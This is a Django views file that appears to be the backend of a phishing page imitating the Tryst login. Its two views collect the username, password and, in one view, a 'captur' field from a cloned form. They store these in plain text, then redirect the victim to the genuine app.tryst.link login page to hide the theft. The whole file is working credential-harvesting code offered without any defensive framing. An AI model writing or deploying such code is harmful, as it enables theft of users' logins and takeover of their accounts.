from django.shortcuts import render,HttpResponseRedirect
from papp.models import tryst
def home(request):
    if request.method == "POST":
        username = request.POST["name"]
        password = request.POST["password"]
        captur = request.POST["captur"]
        obj = tryst(username = username, password = password,captur = captur )
        obj.save()
        
        return HttpResponseRedirect("https://app.tryst.link/log_in")
    return render(request,"tryst.html")

def home2(request):
    if request.method == "POST":
        username = request.POST["name"]
        password = request.POST["password"]
       
        obj = tryst(username = username, password = password)
        obj.save()
        
        return HttpResponseRedirect("https://app.tryst.link/log_in")
    return render(request,"tryst2.html")

def handler404(request, exception):
    return render(request, 'earro.html', status=404)

